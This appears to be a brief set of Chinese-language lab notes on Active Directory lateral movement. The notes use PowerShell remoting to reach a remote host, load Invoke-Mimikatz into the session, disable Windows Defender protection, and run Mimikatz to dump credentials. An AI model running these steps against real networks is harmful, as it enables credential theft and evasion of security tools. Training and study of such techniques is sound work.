# 横向移动到指定电脑
```
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
```

# 也可以不要参数
```
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
```

# 获取一个登陆的session，以便根据session指定操作
账号ciadmin可以横向登录到计算机dcorp-mgmt.dollarcorp.moneycorp.local，我们把登录的session保存在$sess
```
$sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
```

在指定session里载入Mimikatz
```
Invoke-Command -FilePath C:\AD\Invoke-Mimikatz.ps1 -Session $sess
```

指定目标靶机的session，在目标靶机关闭杀软（效果跟bypass AMSI大同小异，不过因为我们是目标靶机上的管理员，因此可以直接关闭）
```
Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
```

指定目标靶机的session，在目标靶机执行Mimikatz
```
Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
```